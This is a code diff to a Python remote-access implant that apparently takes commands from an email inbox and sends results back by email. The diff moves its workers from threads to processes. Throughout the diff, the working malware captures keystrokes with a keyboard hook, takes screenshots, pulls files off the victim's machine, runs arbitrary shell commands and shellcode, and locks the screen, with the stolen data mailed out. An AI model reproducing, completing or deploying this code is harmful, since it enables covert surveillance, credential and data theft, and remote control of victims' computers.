@@ -3,7 +3,7 @@ import sys
 import os
 import base64
 import binascii
-import threading
+import multiprocessing
 import time
 import random
 import string
@@ -86,70 +86,66 @@ class msgparser:
     def getDateHeader(self, msg_data):
         self.date = email.message_from_string(msg_data[1][0][1])['Date']
 
-class keylogger(threading.Thread):
+class KeyLogger(multiprocessing.Process):
 
-    _instance = None
+    def __init__(self):
 
-    def __init__(self, jobid):
+        multiprocessing.Process.__init__(self)
 
-        threading.Thread.__init__(self)
-        self.jobid = jobid
-        self.getkeys = True
+        self.jobid = None
         self.key_buffer = ''
 
-        self.setDaemon(True)
-
-    @staticmethod
-    def getInstance(jobid):
-        if keylogger._instance is None:
-            keylogger._instance = keylogger(jobid)
-
-        return keylogger._instance
+        #self.daemon = True
 
     def run(self):
         logging.debug("[keylogger] started with jobid: {}".format(self.jobid))
 
-        while self.getkeys:
-            hm = pyHook.HookManager() 
-            hm.KeyDown = self.onKeyboardEvent 
-            hm.HookKeyboard() 
-            pythoncom.PumpMessages()
+        hm = pyHook.HookManager() 
+        hm.KeyDown = self.onKeyboardEvent 
+        hm.HookKeyboard() 
+        pythoncom.PumpMessages()
 
     def stop(self):
         logging.debug("[keylogger] stopped with jobid: {}".format(self.jobid))
-
-        self.getkeys = False
-        self._instance = None
-        self.join()
+        self.terminate()
 
     def onKeyboardEvent(self, event):
-        char = chr(event.Ascii)
+        
         if event.Ascii != 0 or 8:
-            try:
-                logging.debug("[keylogger] key: {} key_buffer: {}".format(char, len(self.key_buffer)))
-            except:
-                pass
-            self.key_buffer += char
+            self.key_buffer += chr(event.Ascii)
         
         if event.Ascii == 13:
-            try:
-                logging.debug("[keylogger] key: {} key_buffer: {}".format(char, len(self.key_buffer)))
-            except:
-                pass
-            self.key_buffer += char
+            self.key_buffer += chr(event.Ascii)
 
         if len(self.key_buffer) is 100:
             logging.debug("[keylogger] Resetting key_buffer")
             sendEmail({'CMD': 'keylogger', 'RES': self.key_buffer}, jobid=self.jobid)
             self.key_buffer = ''
 
-class lockScreen(threading.Thread):
+class download(multiprocessing.Process):
+
+    def __init__(self, jobid, filepath):
+        multiprocessing.Process.__init__(self)
+        self.jobid = jobid
+        self.filepath = filepath
+
+        #self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            if os.path.exists(self.filepath) is True:
+                SendEmail({'CMD': 'download', 'RES': 'Success'}, self.jobid, [self.filepath])
+        except Exception as e:
+            SendEmail({'CMD': 'download', 'RES': 'Failed: {}'.format(e)}, self.jobid)
+
+class lockScreen(multiprocessing.Process):
 
     def __init__(self, jobid):
-        threading.Thread.__init__(self)
+        multiprocessing.Process.__init__(self)
         self.jobid = jobid
 
-        self.setDaemon(True)
+        #self.daemon = True
         self.start()
 
     def run(self):
@@ -158,35 +154,50 @@ class lockScreen(threading.Thread):
             sendEmail({'CMD': 'lockscreen', 'RES': 'Success'}, jobid=self.jobid)
         except Exception as e:
             if verbose == True: print print_exc()
-
-class screenshot(threading.Thread):
+"""
+class screenshot(multiprocessing.Process):
 
     def __init__(self, jobid):
-        threading.Thread.__init__(self)
+        multiprocessing.Process.__init__(self)
         self.jobid = jobid
 
-        self.setDaemon(True)
+        #self.daemon = True
         self.start()
 
     def run(self):
         try:
+            screen_dir = os.getenv('TEMP')
             img=ImageGrab.grab()
-            saveas= os.path.join(os.getenv('TEMP'), genRandomString() + '.png')
+            saveas= os.path.join(screen_dir, genRandomString() + '.png')
             img.save(saveas)
             sendEmail({'CMD': 'screenshot', 'RES': 'Screenshot taken'}, jobid=self.jobid, attachment=[saveas])
             #os.remove(saveas)
         except Exception as e:
             if verbose == True: print_exc()
             pass
+"""
 
-class execShellcode(threading.Thread):
+def screenshot(jobid):
+    try:
+        #screen_dir = os.getenv('TEMP')
+        img=ImageGrab.grab()
+        saveas= os.path.join(os.getenv('TEMP'), genRandomString() + '.png')
+        img.save(saveas)
+        sendEmail({'CMD': 'screenshot', 'RES': 'Screenshot taken'}, jobid=jobid, attachment=[saveas])
+        time.sleep(0.5)
+        os.remove(saveas)
+    except Exception as e:
+        if verbose == True: print_exc()
+        pass
+
+class execShellcode(multiprocessing.Process):
 
     def __init__(self, shellc, jobid):
-        threading.Thread.__init__(self)
+        multiprocessing.Process.__init__(self)
         self.shellc = shellc
         self.jobid = jobid
 
-        self.setDaemon(True)
+        #self.daemon = True
         self.start()
 
     def run(self):
@@ -214,14 +225,14 @@ class execShellcode(threading.Thread):
         except Exception as e:
             if verbose == True: print_exc()
 
-class execCmd(threading.Thread):
+class execCmd(multiprocessing.Process):
 
     def __init__(self, command, jobid):
-        threading.Thread.__init__(self)
+        multiprocessing.Process.__init__(self)
         self.command = command
         self.jobid = jobid
 
-        self.setDaemon(True)
+        #self.daemon = True
         self.start()
 
     def run(self):
@@ -235,17 +246,17 @@ class execCmd(threading.Thread):
             if verbose == True: print_exc()
             pass
 
-class sendEmail(threading.Thread):
+class sendEmail(multiprocessing.Process):
 
     def __init__(self, text, jobid='', attachment=[], checkin=False):
         
-        threading.Thread.__init__(self)
+        multiprocessing.Process.__init__(self)
         self.text = text
         self.jobid = jobid
         self.attachment = attachment
         self.checkin = checkin
         
-        self.setDaemon(True)
+        self.daemon = True
         self.start()
 
     def run(self):
@@ -264,7 +275,7 @@ class sendEmail(threading.Thread):
         msg.attach(MIMEText(str(message_content)))
 
         for attach in self.attachment:
-            if os.path.exists(attach) == True:  
+            if os.path.exists(attach) == True:
                 part = MIMEBase('application', 'octet-stream')
                 part.set_payload(open(attach, 'rb').read())
                 Encoders.encode_base64(part)
@@ -286,6 +297,8 @@ class sendEmail(threading.Thread):
 
 def checkJobs():
     #Here we check the inbox for queued jobs, parse them and start a thread
+
+    keylogger = KeyLogger()
 
     while True:
 
@@ -314,11 +327,7 @@ def checkJobs():
                         execShellcode(arg, jobid)
 
                     elif cmd == 'download':
-                        try:
-                            if os.path.exists(arg) is True:
-                                SendEmail({'CMD': 'download', 'RES': 'Success'}, jobid, [arg])
-                        except Exception as e:
-                            SendEmail({'CMD': 'download', 'RES': 'Failed: {}'.format(e)}, jobid)
+                        download(jobid, arg)
 
                     elif cmd == 'screenshot':
                         screenshot(jobid)
@@ -330,10 +339,14 @@ def checkJobs():
                         lockScreen(jobid)
 
                     elif cmd == 'startkeylogger':
-                        keylogger.getInstance(jobid).start()
+                        if not keylogger.is_alive():
+                            keylogger.jobid = jobid
+                            keylogger.start()
 
                     elif cmd == 'stopkeylogger':
-                        keylogger.getInstance(jobid).stop()
+                        if keylogger.is_alive():
+                            keylogger.stop()
+                            keylogger.join()
 
                     elif cmd == 'forcecheckin':
                         sendEmail("Host checking in as requested", checkin=True)
